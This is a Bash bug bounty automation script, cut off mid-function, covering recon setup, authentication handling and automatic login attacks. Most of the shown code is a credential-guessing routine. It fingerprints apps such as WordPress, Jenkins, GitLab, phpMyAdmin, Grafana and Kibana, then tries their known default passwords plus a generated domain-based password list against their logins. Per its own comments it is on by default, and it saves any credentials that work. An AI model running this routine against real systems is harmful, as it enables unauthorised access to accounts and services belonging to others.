#!/usr/bin/env bash
# =============================================================================
#  bbhunt.sh — Bug Bounty Automation Framework
#  Full-pipeline reconnaissance & vulnerability scanning for bug bounty hunting
# =============================================================================
set -uo pipefail

# Prioritize Go bin so ProjectDiscovery tools (httpx, nuclei, katana) take precedence
export PATH="/home/kali/go/bin:/home/kali/Tools/linux:$PATH"

# ─── Colors & Formatting ─────────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
DIM='\033[2m'
RESET='\033[0m'

# ─── Banner ───────────────────────────────────────────────────────────────────
banner() {
cat << 'EOF'
  ██████╗ ██████╗ ██╗  ██╗██╗   ██╗███╗   ██╗████████╗
  ██╔══██╗██╔══██╗██║  ██║██║   ██║████╗  ██║╚══██╔══╝
  ██████╔╝██████╔╝███████║██║   ██║██╔██╗ ██║   ██║
  ██╔══██╗██╔══██╗██╔══██║██║   ██║██║╚██╗██║   ██║
  ██████╔╝██████╔╝██║  ██║╚██████╔╝██║ ╚████║   ██║
  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝
  Bug Bounty Automation Framework v2.0 | 2025 Edition
EOF
}

# ─── Logging helpers ──────────────────────────────────────────────────────────
log_info()    { echo -e "${CYAN}[INFO]${RESET}  $*"; }
log_ok()      { echo -e "${GREEN}[OK]${RESET}    $*"; }
log_warn()    { echo -e "${YELLOW}[WARN]${RESET}  $*"; }
log_error()   { echo -e "${RED}[ERROR]${RESET} $*"; }
log_phase()   { echo -e "\n${BOLD}${MAGENTA}══════════════════════════════════════════${RESET}"; echo -e "${BOLD}${MAGENTA}  $*${RESET}"; echo -e "${BOLD}${MAGENTA}══════════════════════════════════════════${RESET}"; }
log_finding() { echo -e "${RED}${BOLD}[FINDING]${RESET} $*"; }
log_dim()     { echo -e "${DIM}$*${RESET}"; }

# ─── Defaults ─────────────────────────────────────────────────────────────────
TARGET=""
OUTDIR=""
THREADS=50
RATE_LIMIT=100          # nuclei requests/sec
SCAN_RATE=5000          # masscan rate
DEPTH=3                 # crawl depth
WORDLIST_DIR="/usr/share/seclists"
RESOLVERS_URL="https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt"
INTERACTSH_SERVER="oast.pro"  # Public interactsh server
NOTIFY_ENABLED=false
SCOPE_REGEX=""          # Optional: regex to restrict crawl scope
SKIP_BRUTEFORCE=false
SKIP_PORTSCAN=false
SKIP_CRAWL=false
SKIP_CONTENT=false
SKIP_VULNS=false
SKIP_SCREENSHOTS=false
SINGLE_PHASE=""         # Run only a specific phase
RESUME=false            # Resume from existing output
START_TIME=$(date +%s)

# ─── Auth settings ────────────────────────────────────────────────────────────
AUTH_TOKEN=""                   # Bearer token / JWT / API key
AUTH_COOKIE=""                  # Cookie string (e.g. "JSESSIONID=abc; token=xyz")
AUTH_HEADER=""                  # Raw auth header (e.g. "Authorization: Basic dXNlcjpwYXNz")
AUTH_USER=""                    # Username for form-based login
AUTH_PASS=""                    # Password for form-based login
AUTH_LOGIN_URL=""               # Login endpoint (e.g. http://target.com/login)
AUTH_FORM_USER_FIELD="username" # Form field name for username
AUTH_FORM_PASS_FIELD="password" # Form field name for password
TRY_DEFAULT_CREDS=true          # Auto-detect app and try known default credentials (always on)
AUTH_MODE="none"                # Populated by setup_auth: none|token|cookie|header|form|auto
AUTH_SESSION_FILE=""            # Curl cookie jar file path
# Populated by setup_auth() — injected into all scanning tools:
AUTH_CURL_OPTS=()
AUTH_HTTPX_OPTS=()
AUTH_NUCLEI_OPTS=()
AUTH_FFUF_OPTS=()
AUTH_KATANA_OPTS=()
AUTH_DALFOX_OPTS=()
AUTH_SQLMAP_OPTS=()
AUTH_FEROX_OPTS=()

# ─── Notification settings ────────────────────────────────────────────────────
# Load from ~/.config/bbhunt/notify.conf or set via CLI flags
TELEGRAM_BOT_TOKEN=""           # Telegram bot token (from @BotFather)
TELEGRAM_CHAT_ID=""             # Telegram chat/user ID
DISCORD_WEBHOOK_URL=""          # Discord webhook URL
NOTIFY_EMAIL_TO=""              # Destination email address
SMTP_HOST="smtp.gmail.com"      # SMTP server
SMTP_PORT="587"                 # SMTP port
SMTP_USER=""                    # SMTP username
SMTP_PASS=""                    # SMTP password
TG_LAST_UPDATE_ID=0             # Telegram polling state
TG_POLL_INTERVAL=30             # Seconds between command polls
TG_BOT_MODE=false               # Standalone bot listener mode
NOTIFY_CONF="${HOME}/.config/bbhunt/notify.conf"
STATE_FILE="${HOME}/.config/bbhunt/scan.state"    # Shared scan state (bot+scan sync)

# ─── Usage ────────────────────────────────────────────────────────────────────
usage() {
    echo -e "${BOLD}Usage:${RESET} $0 -d <domain> [options]"
    echo
    echo -e "${BOLD}Required:${RESET}"
    echo "  -d <domain>         Target domain (e.g. example.com)"
    echo
    echo -e "${BOLD}Options:${RESET}"
    echo "  -o <dir>            Output directory (default: ./results/<domain>_<date>)"
    echo "  -t <threads>        Thread count (default: 50)"
    echo "  -r <rate>           Nuclei request rate/sec (default: 100)"
    echo "  -w <wordlist_dir>   SecLists base directory (default: /usr/share/seclists)"
    echo "  -s <regex>          Scope regex for crawling (e.g. '.*\.example\.com')"
    echo "  -p <phase>          Run single phase only (recon|dns|ports|http|infra|crawl|urls|content|vulns|xss|sqli|secrets|screenshots|takeover|cors|403|report)"
    echo "  --resume            Resume from existing output directory"
    echo "  --skip-bruteforce   Skip DNS bruteforce (faster)"
    echo "  --skip-portscan     Skip port scanning"
    echo "  --skip-crawl        Skip web crawling"
    echo "  --skip-content      Skip directory/file bruteforce (ffuf/feroxbuster)"
    echo "  --skip-vulns        Skip vulnerability scanning"
    echo "  --skip-screenshots  Skip screenshots"
    echo "  --notify            Enable notify (Slack/Telegram/Discord — configure ~/.config/notify/notify.yaml)"
    echo "  --install           Install all required tools"
    echo "  --check             Check tool availability"
    echo "  -h                  Show this help"
    echo
    echo -e "${BOLD}Authentication (increases coverage of authenticated endpoints):${RESET}"
    echo "  --auth-token <token>        Bearer token / JWT / API key (adds Authorization: Bearer)"
    echo "  --auth-cookie <cookie>      Cookie string (e.g. \"JSESSIONID=abc; token=xyz\")"
    echo "  --auth-header <header>      Raw auth header (e.g. \"Authorization: Basic dXNlcjpwYXNz\")"
    echo "  --auth-user <user>          Username for form-based login"
    echo "  --auth-pass <pass>          Password for form-based login"
    echo "  --auth-login-url <url>      Login endpoint URL (required with --auth-user/pass)"
    echo "  --auth-form-user <field>    Login form username field name (default: username)"
    echo "  --auth-form-pass <field>    Login form password field name (default: password)"
    echo "  --try-default-creds         Auto-detect app type and try known default credentials (ON by default)"
    echo "  --no-default-creds          Disable default credential testing"
    echo
    echo -e "${BOLD}Notifications (Telegram / Discord / Email):${RESET}"
    echo "  --tg-token <token>          Telegram bot token"
    echo "  --tg-chat <id>              Telegram chat ID (run: @userinfobot to get yours)"
    echo "  --discord <webhook_url>     Discord webhook URL"
    echo "  --email <address>           Email address for notifications"
    echo "  --smtp-host <host>          SMTP server (default: smtp.gmail.com)"
    echo "  --smtp-port <port>          SMTP port (default: 587)"
    echo "  --smtp-user <user>          SMTP username"
    echo "  --smtp-pass <pass>          SMTP password"
    echo "  --bot-listen                Start Telegram bot listener (accept scan commands from phone)"
    echo "  --setup-notify              Create sample ~/.config/bbhunt/notify.conf and exit"
    echo "  (Config file: ~/.config/bbhunt/notify.conf — set TELEGRAM_BOT_TOKEN= etc.)"
    echo
    echo -e "${BOLD}Examples:${RESET}"
    echo "  $0 -d example.com"
    echo "  $0 -d example.com -o /tmp/scan --skip-portscan"
    echo "  $0 -d example.com -p recon"
    echo "  $0 -d example.com --try-default-creds"
    echo "  $0 -d example.com --auth-cookie \"JSESSIONID=abc123\""
    echo "  $0 -d example.com --auth-token \"eyJhbGciOiJIUzI1NiJ9...\""
    echo "  $0 -d example.com --auth-user admin --auth-pass admin --auth-login-url http://example.com/login"
    echo "  $0 --install"
    exit 0
}

# ─── Argument parsing ─────────────────────────────────────────────────────────
parse_args() {
    [[ $# -eq 0 ]] && usage
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -d) TARGET="$2"; shift 2 ;;
            -o) OUTDIR="$2"; shift 2 ;;
            -t) THREADS="$2"; shift 2 ;;
            -r) RATE_LIMIT="$2"; shift 2 ;;
            -w) WORDLIST_DIR="$2"; shift 2 ;;
            -s) SCOPE_REGEX="$2"; shift 2 ;;
            -p) SINGLE_PHASE="$2"; shift 2 ;;
            --resume) RESUME=true; shift ;;
            --skip-bruteforce) SKIP_BRUTEFORCE=true; shift ;;
            --skip-portscan) SKIP_PORTSCAN=true; shift ;;
            --skip-crawl) SKIP_CRAWL=true; shift ;;
            --skip-content) SKIP_CONTENT=true; shift ;;
            --skip-vulns) SKIP_VULNS=true; shift ;;
            --skip-screenshots) SKIP_SCREENSHOTS=true; shift ;;
            --notify) NOTIFY_ENABLED=true; shift ;;
            --auth-token) AUTH_TOKEN="$2"; shift 2 ;;
            --auth-cookie) AUTH_COOKIE="$2"; shift 2 ;;
            --auth-header) AUTH_HEADER="$2"; shift 2 ;;
            --auth-user) AUTH_USER="$2"; shift 2 ;;
            --auth-pass) AUTH_PASS="$2"; shift 2 ;;
            --auth-login-url) AUTH_LOGIN_URL="$2"; shift 2 ;;
            --auth-form-user) AUTH_FORM_USER_FIELD="$2"; shift 2 ;;
            --auth-form-pass) AUTH_FORM_PASS_FIELD="$2"; shift 2 ;;
            --try-default-creds) TRY_DEFAULT_CREDS=true; shift ;;
            --no-default-creds) TRY_DEFAULT_CREDS=false; shift ;;
            --tg-token) TELEGRAM_BOT_TOKEN="$2"; shift 2 ;;
            --tg-chat)  TELEGRAM_CHAT_ID="$2"; shift 2 ;;
            --discord)  DISCORD_WEBHOOK_URL="$2"; shift 2 ;;
            --email)    NOTIFY_EMAIL_TO="$2"; shift 2 ;;
            --smtp-host) SMTP_HOST="$2"; shift 2 ;;
            --smtp-port) SMTP_PORT="$2"; shift 2 ;;
            --smtp-user) SMTP_USER="$2"; shift 2 ;;
            --smtp-pass) SMTP_PASS="$2"; shift 2 ;;
            --bot-listen) TG_BOT_MODE=true; shift ;;
            --setup-notify) setup_notify_config; exit 0 ;;
            --install) install_tools; exit 0 ;;
            --check) check_tools; exit 0 ;;
            -h|--help) usage ;;
            *) log_error "Unknown argument: $1"; usage ;;
        esac
    done
    $TG_BOT_MODE && return   # bot-listen mode doesn't need a target
    [[ -z "$TARGET" ]] && { log_error "Target domain (-d) is required."; usage; }
}

# ─── Directory setup ──────────────────────────────────────────────────────────
setup_dirs() {
    local date_stamp; date_stamp=$(date +%Y%m%d_%H%M%S)
    [[ -z "$OUTDIR" ]] && OUTDIR="$(pwd)/results/${TARGET}_${date_stamp}"

    if $RESUME && [[ -d "$OUTDIR" ]]; then
        log_warn "Resuming scan in: $OUTDIR"
    else
        mkdir -p "$OUTDIR"
    fi

    mkdir -p \
        "$OUTDIR/recon/subdomains" \
        "$OUTDIR/recon/dns" \
        "$OUTDIR/recon/ports" \
        "$OUTDIR/recon/http" \
        "$OUTDIR/recon/urls" \
        "$OUTDIR/recon/js" \
        "$OUTDIR/recon/wordlists" \
        "$OUTDIR/vulns/nuclei" \
        "$OUTDIR/vulns/xss" \
        "$OUTDIR/vulns/sqli" \
        "$OUTDIR/vulns/ssrf" \
        "$OUTDIR/vulns/cors" \
        "$OUTDIR/vulns/takeover" \
        "$OUTDIR/vulns/403bypass" \
        "$OUTDIR/vulns/secrets" \
        "$OUTDIR/screenshots" \
        "$OUTDIR/reports"

    # Convenience path variables
    SUBS_DIR="$OUTDIR/recon/subdomains"
    DNS_DIR="$OUTDIR/recon/dns"
    PORTS_DIR="$OUTDIR/recon/ports"
    HTTP_DIR="$OUTDIR/recon/http"
    URLS_DIR="$OUTDIR/recon/urls"
    JS_DIR="$OUTDIR/recon/js"
    VULN_DIR="$OUTDIR/vulns"
    SHOTS_DIR="$OUTDIR/screenshots"
    REPORT_DIR="$OUTDIR/reports"

    # Key output files
    ALL_SUBS="$SUBS_DIR/all_subs.txt"
    RESOLVED_SUBS="$SUBS_DIR/resolved_subs.txt"
    LIVE_HOSTS="$HTTP_DIR/live_hosts.txt"
    ALL_URLS="$URLS_DIR/all_urls.txt"
    JS_FILES="$JS_DIR/js_files.txt"
    RESOLVERS="$OUTDIR/recon/dns/resolvers.txt"

    # Pre-create all output files so wc -l never fails
    touch "$ALL_SUBS" "$RESOLVED_SUBS" "$LIVE_HOSTS" "$ALL_URLS" "$JS_FILES" \
        "$VULN_DIR/nuclei/critical_high.jsonl" \
        "$VULN_DIR/nuclei/all_findings.jsonl" \
        "$VULN_DIR/xss/dalfox_findings.txt" \
        "$VULN_DIR/xss/reflected.txt" \
        "$VULN_DIR/sqli/sqli_candidates.txt" \
        "$VULN_DIR/ssrf/open_redirects.txt" \
        "$VULN_DIR/cors/cors_findings.txt" \
        "$VULN_DIR/takeover/dangling_cnames.txt" \
        "$VULN_DIR/secrets/js_secrets.txt" \
        "$VULN_DIR/403bypass/bypassed.txt" \
        "$HTTP_DIR/sensitive_files.txt" 2>/dev/null || true

    log_ok "Output directory: ${BOLD}$OUTDIR${RESET}"
}

# ─── Authentication ───────────────────────────────────────────────────────────

# Populate all AUTH_*_OPTS arrays from a cookie string
_populate_auth_from_cookie() {
    local cookie="$1"
    local hdr="Cookie: $cookie"
    AUTH_CURL_OPTS=("-H" "$hdr")
    AUTH_HTTPX_OPTS=("-H" "$hdr")
    AUTH_NUCLEI_OPTS=("-H" "$hdr")
    AUTH_FFUF_OPTS=("-H" "$hdr")
    AUTH_KATANA_OPTS=("-H" "$hdr")
    AUTH_DALFOX_OPTS=("--cookie" "$cookie")
    AUTH_SQLMAP_OPTS=("--cookie" "$cookie")
    AUTH_FEROX_OPTS=("-H" "$hdr")
}

# Perform a POST form login; on success sets AUTH_COOKIE and returns 0
_try_form_login() {
    local login_url="$1" user_field="$2" pass_field="$3" username="$4" password="$5"
    local tmp_jar; tmp_jar=$(mktemp /tmp/bbhunt_jar_XXXXXX)
    local tmp_body; tmp_body=$(mktemp /tmp/bbhunt_body_XXXXXX)

    curl -s \
        -c "$tmp_jar" \
        -b "$tmp_jar" \
        -X POST \
        --data-urlencode "${user_field}=${username}" \
        --data-urlencode "${pass_field}=${password}" \
        -L --max-redirs 5 \
        --connect-timeout 10 \
        -o "$tmp_body" \
        "$login_url" 2>/dev/null

    # Count all cookies including HttpOnly ones (#HttpOnly_ prefix in jar)
    local got_cookie; got_cookie=$(grep -E "^(#HttpOnly_)?[^#]" "$tmp_jar" 2>/dev/null | \
        grep -v "^$" | wc -l)
    local body_failed=false
    if grep -qiE "invalid (password|credentials|username)|login (failed|error)|incorrect (password|credentials)|authentication failed|wrong password|bad credentials|sign in failed" \
            "$tmp_body" 2>/dev/null; then
        body_failed=true
    fi
    rm -f "$tmp_body"

    if [[ "$got_cookie" -gt 0 ]] && ! $body_failed; then
        cp "$tmp_jar" "$AUTH_SESSION_FILE"
        # Extract ALL cookies (including HttpOnly) — strip the #HttpOnly_ prefix first
        AUTH_COOKIE=$(sed 's/^#HttpOnly_//' "$AUTH_SESSION_FILE" 2>/dev/null | \
            grep -v "^#\|^$" | \
            awk -F'\t' 'NF>=7{print $6"="$7}' | tr '\n' ';' | sed 's/;$//')
        rm -f "$tmp_jar"
        return 0
    fi

    rm -f "$tmp_jar"
    return 1
}

# Setup auth from explicit flags (token / cookie / header / form)
setup_auth() {
    AUTH_SESSION_FILE="$OUTDIR/auth_session.txt"
    touch "$AUTH_SESSION_FILE"

    if [[ -n "$AUTH_HEADER" ]]; then
        AUTH_MODE="header"
        AUTH_CURL_OPTS=("-H" "$AUTH_HEADER")
        AUTH_HTTPX_OPTS=("-H" "$AUTH_HEADER")
        AUTH_NUCLEI_OPTS=("-H" "$AUTH_HEADER")
        AUTH_FFUF_OPTS=("-H" "$AUTH_HEADER")
        AUTH_KATANA_OPTS=("-H" "$AUTH_HEADER")
        AUTH_DALFOX_OPTS=("--header" "$AUTH_HEADER")
        AUTH_SQLMAP_OPTS=("--headers" "$AUTH_HEADER")
        AUTH_FEROX_OPTS=("-H" "$AUTH_HEADER")
        log_ok "Auth mode: custom header → ${AUTH_HEADER:0:60}"

    elif [[ -n "$AUTH_TOKEN" ]]; then
        AUTH_MODE="token"
        local hdr="Authorization: Bearer $AUTH_TOKEN"
        AUTH_CURL_OPTS=("-H" "$hdr")
        AUTH_HTTPX_OPTS=("-H" "$hdr")
        AUTH_NUCLEI_OPTS=("-H" "$hdr")
        AUTH_FFUF_OPTS=("-H" "$hdr")
        AUTH_KATANA_OPTS=("-H" "$hdr")
        AUTH_DALFOX_OPTS=("--header" "$hdr")
        AUTH_SQLMAP_OPTS=("--headers" "$hdr")
        AUTH_FEROX_OPTS=("-H" "$hdr")
        log_ok "Auth mode: Bearer token → ${AUTH_TOKEN:0:20}..."

    elif [[ -n "$AUTH_COOKIE" ]]; then
        AUTH_MODE="cookie"
        _populate_auth_from_cookie "$AUTH_COOKIE"
        log_ok "Auth mode: cookie → ${AUTH_COOKIE:0:60}"

    elif [[ -n "$AUTH_USER" && -n "$AUTH_PASS" && -n "$AUTH_LOGIN_URL" ]]; then
        AUTH_MODE="form"
        log_info "Auth: performing form login → $AUTH_LOGIN_URL as ${AUTH_USER}"
        if _try_form_login "$AUTH_LOGIN_URL" "$AUTH_FORM_USER_FIELD" "$AUTH_FORM_PASS_FIELD" \
                "$AUTH_USER" "$AUTH_PASS"; then
            _populate_auth_from_cookie "$AUTH_COOKIE"
            log_ok "Auth: form login succeeded (${AUTH_USER}) → cookie: ${AUTH_COOKIE:0:50}"
        else
            log_warn "Auth: form login failed for ${AUTH_USER} — continuing unauthenticated"
            AUTH_MODE="none"
        fi
    fi
}

# ─── Custom wordlist generator ────────────────────────────────────────────────
# Builds a target-specific password candidate list from domain name & company info
generate_target_wordlist() {
    local target="$1"
    local out_file="$OUTDIR/recon/wordlists/target_passwords.txt"
    local company; company=$(echo "$target" | cut -d. -f1)  # e.g. "example" from example.com
    local company_cap; company_cap="$(tr '[:lower:]' '[:upper:]' <<< "${company:0:1}")${company:1}"
    local year; year=$(date +%Y)
    local year_s; year_s=$(date +%y)

    log_info "  Generating target-specific password wordlist for '${company}'..."

    {
        # Company-based patterns
        echo "${company}"
        echo "${company_cap}"
        echo "${company}123"
        echo "${company}1234"
        echo "${company}12345"
        echo "${company}@123"
        echo "${company}@1234"
        echo "${company}!123"
        echo "${company}${year}"
        echo "${company}${year_s}"
        echo "${company}_${year}"
        echo "${company}#${year}"
        echo "${company_cap}123"
        echo "${company_cap}@123"
        echo "${company_cap}${year}"
        echo "${company_cap}${year}!"
        echo "${company_cap}@${year}"
        echo "Admin${company_cap}"
        echo "${company}admin"
        echo "${company}Admin"
        echo "${company}pass"
        echo "${company}Pass"
        echo "${company}password"
        echo "${company}Password"
        echo "Welcome${year}"
        echo "Welcome@${year}"
        echo "Welcome1"
        echo "P@ssw0rd"
        echo "P@ssword1"
        echo "P@\$\$w0rd"
        echo "Passw0rd"
        echo "Passw0rd!"
        echo "Password1"
        echo "Password@1"
        echo "password"
        echo "password1"
        echo "password123"
        echo "password@123"
        echo "admin"
        echo "admin123"
        echo "admin@123"
        echo "Admin123"
        echo "Admin@123"
        echo "administrator"
        echo "Administrator1"
        echo "root"
        echo "root123"
        echo "toor"
        echo "1234"
        echo "12345"
        echo "123456"
        echo "1234567"
        echo "12345678"
        echo "123456789"
        echo "1234567890"
        echo "test"
        echo "test123"
        echo "Test@123"
        echo "demo"
        echo "demo123"
        echo "demo1234"
        echo "Demo@123"
        echo "guest"
        echo "guest123"
        echo "changeme"
        echo "changeme123"
        echo "Change@me1"
        echo "default"
        echo "Default1"
        echo "secret"
        echo "Secret123"
        echo "qwerty"
        echo "qwerty123"
        echo "letmein"
        echo "iloveyou"
        echo "sunshine"
        echo "abc123"
        echo "abc@123"
        echo "Abc@123"
        echo "111111"
        echo "000000"
        echo "pass"
        echo "pass123"
        echo "pass@123"
        # Service-common patterns
        echo "monitor"
        echo "monitor123"
        echo "sysadmin"
        echo "superadmin"
        echo "superuser"
        echo "manager"
        echo "Manager@1"
        echo "devops"
        echo "devops123"
        echo "support"
        echo "support123"
        echo "helpdesk"
        echo "service"
        echo "service123"
    } | sort -u > "$out_file"

    local count; count=$(wc -l < "$out_file")
    log_ok "  Target wordlist: ${count} passwords → $out_file"
    echo "$out_file"
}

# ─── Basic-auth brute helper ──────────────────────────────────────────────────
_try_basic_auth() {
    local app="$1" url="$2"; shift 2
    log_info "  Detected: ${app} — trying basic auth on ${url}"
    for cred in "$@"; do
        local u="${cred%%:*}" p="${cred#*:}"
        log_dim "    Trying ${u}:${p}..."
        local code; code=$(curl -s -o /dev/null -w "%{http_code}" \
            --connect-timeout 5 --max-time 8 -u "${u}:${p}" "$url" 2>/dev/null)
        if [[ "$code" == "200" ]]; then
            AUTH_MODE="auto"
            local encoded; encoded=$(printf '%s' "${u}:${p}" | base64)
            local hdr="Authorization: Basic $encoded"
            AUTH_CURL_OPTS=("-H" "$hdr")
            AUTH_HTTPX_OPTS=("-H" "$hdr")
            AUTH_NUCLEI_OPTS=("-H" "$hdr")
            AUTH_FFUF_OPTS=("-H" "$hdr")
            AUTH_KATANA_OPTS=("-H" "$hdr")
            AUTH_DALFOX_OPTS=("--header" "$hdr")
            AUTH_SQLMAP_OPTS=("--headers" "$hdr")
            AUTH_FEROX_OPTS=("-H" "$hdr")
            log_ok "  Basic auth worked: ${u}:${p}"
            echo "${u}:${p}" >> "$OUTDIR/auth_creds_found.txt"
            return 0
        fi
    done
    return 1
}

# Auto-detect app from httpx output and try known default credentials
# Called after phase_http. TRY_DEFAULT_CREDS=true by default.
try_default_creds() {
    [[ "$AUTH_MODE" != "none" ]] && return
    log_phase "Auto Auth: Detecting App & Trying Default Credentials"

    local httpx_data; httpx_data=$(cat "$HTTP_DIR/httpx_full.txt" 2>/dev/null || echo "")
    [[ -z "$httpx_data" ]] && { log_warn "  No httpx data yet — skipping default creds"; return; }

    # Extract a usable base URL from httpx output
    local base_url; base_url=$(grep -oP 'https?://[^ \[]+' "$HTTP_DIR/httpx_full.txt" 2>/dev/null | \
        head -1 | grep -oP 'https?://[^/]+' || echo "http://$TARGET")

    # Generate target-specific passwords (domain-aware)
    local custom_wl; custom_wl=$(generate_target_wordlist "$TARGET")

    # Helper: try cred list + target wordlist against a form login
    _detect_try() {
        local app="$1" login_path="$2" user_field="$3" pass_field="$4"; shift 4
        log_info "  Detected: ${app} — trying default creds on ${base_url}${login_path}"
        local all_creds=("$@")
        # Append custom wordlist entries for admin/root usernames
        if [[ -s "$custom_wl" ]]; then
            while IFS= read -r pw; do
                all_creds+=("admin:${pw}" "root:${pw}" "administrator:${pw}")
            done < "$custom_wl"
        fi
        for cred in "${all_creds[@]}"; do
            local u="${cred%%:*}" p="${cred#*:}"
            log_dim "    Trying ${u}:${p}..."
            if _try_form_login "${base_url}${login_path}" "$user_field" "$pass_field" "$u" "$p"; then
                AUTH_MODE="auto"
                _populate_auth_from_cookie "$AUTH_COOKIE"
                log_ok "  Default creds worked: ${u}:${p}"
                echo "${u}:${p}" >> "$OUTDIR/auth_creds_found.txt"
                notify_all "🔑 Default creds found on ${base_url}: ${u}:${p} (${app})"
                return 0
            fi
        done
        return 1
    }

    # ── AltoroMutual / IBM testfire ──────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "altoro|testfire|altoromutual"; then
        _detect_try "AltoroMutual" "/doLogin" "uid" "passw" \
            "admin:admin" "admin:admin123" "admin:demo1234" \
            "jsmith:demo1234" "sspeed:demo1234" "tbrown:demo1234" \
            "tuser:demo1234" "jdoe:demo1234" "admin:AltoroMutual" && return 0
    fi

    # ── DVWA ─────────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "damn vulnerable web application|dvwa"; then
        _detect_try "DVWA" "/login.php" "username" "password" \
            "admin:password" "admin:admin" "admin:abc123" \
            "user:user" "gordonb:abc123" "1337:charley" "pablo:letmein" && return 0
    fi

    # ── OWASP Juice Shop ─────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "owasp juice shop|juice.?shop"; then
        _detect_try "Juice Shop" "/rest/user/login" "email" "password" \
            "admin@juice-sh.op:admin123" \
            "admin@juice-sh.op:admin" \
            "jim@juice-sh.op:ncc-1701" \
            "bjoern@juice-sh.op:kitten hood" && return 0
    fi

    # ── WebGoat ──────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "webgoat"; then
        _detect_try "WebGoat" "/WebGoat/login" "username" "password" \
            "guest:guest" "admin:admin" "webgoat:webgoat" \
            "user:user" "test:test" && return 0
    fi

    # ── Mutillidae ───────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "mutillidae|nowasp"; then
        _detect_try "Mutillidae" "/index.php?page=login.php" "username" "password" \
            "admin:adminpass" "admin:admin" "anonymous:anonymous" \
            "jeremy:jeremy" "samurai:samurai" && return 0
    fi

    # ── Jenkins ──────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "jenkins"; then
        # Jenkins 2.x+ uses initial admin password from file; also try common ones
        _detect_try "Jenkins" "/j_spring_security_check" "j_username" "j_password" \
            "admin:admin" "admin:password" "jenkins:jenkins" \
            "admin:jenkins" "admin:123456" "root:password" && return 0
    fi

    # ── WordPress ────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "wordpress|wp-login"; then
        _detect_try "WordPress" "/wp-login.php" "log" "pwd" \
            "admin:admin" "admin:password" "admin:admin123" \
            "admin:wordpress" "admin:123456" "admin:letmein" \
            "wordpress:wordpress" "user:password" && return 0
    fi

    # ── Joomla ───────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "joomla"; then
        _detect_try "Joomla" "/administrator/index.php" "username" "passwd" \
            "admin:admin" "admin:password" "admin:joomla" \
            "admin:admin123" "administrator:administrator" && return 0
    fi

    # ── Drupal ───────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "drupal"; then
        _detect_try "Drupal" "/user/login" "name" "pass" \
            "admin:admin" "admin:password" "admin:drupal" \
            "drupal:drupal" "root:root" && return 0
    fi

    # ── GitLab ───────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "gitlab"; then
        _detect_try "GitLab" "/users/sign_in" "user[login]" "user[password]" \
            "root:5iveL!fe" "root:password" "root:root" \
            "root:gitlab" "root:12345678" "admin:admin" && return 0
    fi

    # ── Grafana ──────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "grafana"; then
        _detect_try "Grafana" "/login" "user" "password" \
            "admin:admin" "admin:password" "admin:grafana" \
            "admin:secret" "grafana:grafana" && return 0
    fi

    # ── SonarQube ────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "sonarqube|sonar"; then
        _detect_try "SonarQube" "/api/authentication/login" "login" "password" \
            "admin:admin" "admin:sonar" "sonar:sonar" && return 0
    fi

    # ── phpMyAdmin ───────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "phpmyadmin"; then
        _detect_try "phpMyAdmin" "/index.php" "pma_username" "pma_password" \
            "root:" "root:root" "root:toor" "root:password" \
            "admin:admin" "pma:pma" && return 0
    fi

    # ── Kibana ───────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "kibana"; then
        _detect_try "Kibana" "/login" "username" "password" \
            "elastic:changeme" "elastic:elastic" "admin:admin" \
            "kibana:kibana" "kibana_system:changeme" && return 0
    fi

    # ── MinIO ────────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "minio|min\.io"; then
        _detect_try "MinIO" "/minio/login" "accessKey" "secretKey" \
            "minioadmin:minioadmin" "minio:minio123" \
            "admin:admin123" "access:secret" && return 0
    fi

    # ── Portainer ────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "portainer"; then
        _detect_try "Portainer" "/api/auth" "username" "password" \
            "admin:admin" "admin:portainer" "admin:password" \
            "admin:adminadmin" && return 0
    fi

    # ── Nexus Repository ─────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "nexus repository|sonatype nexus"; then
        _detect_try "Nexus" "/service/rest/v1/security/users" "username" "password" \
            "admin:admin123" "admin:admin" "nexus:nexus" && return 0
    fi

    # ── JFrog Artifactory ────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "artifactory|jfrog"; then
        _detect_try "Artifactory" "/ui/login" "user" "password" \
            "admin:password" "admin:admin" "artifactory:password" && return 0
    fi

    # ── Rancher ──────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "rancher"; then
        _detect_try "Rancher" "/v3-public/localProviders/local?action=login" "username" "password" \
            "admin:admin" "admin:password" "rancher:rancher" && return 0
    fi

    # ── Keycloak ─────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "keycloak"; then
        _detect_try "Keycloak" "/auth/realms/master/protocol/openid-connect/token" "username" "password" \
            "admin:admin" "admin:password" "keycloak:keycloak" && return 0
    fi

    # ── RabbitMQ Management ───────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "rabbitmq"; then
        _try_basic_auth "RabbitMQ" "${base_url}/api/whoami" \
            "guest:guest" "admin:admin" "rabbitmq:rabbitmq" \
            "admin:password" "user:user" && return 0
    fi

    # ── Consul ───────────────────────────────────────────────────────────────
    if echo "$httpx_data" | grep -qiE "consul"; then
        _try_basic_auth "Consul" "${base_url}/ui/dc1/services" \
            "admin:admin" "consul:consul" && return 0
    fi

    # ── AWX / Ansible Tower ───────────────────────────────────────────────────
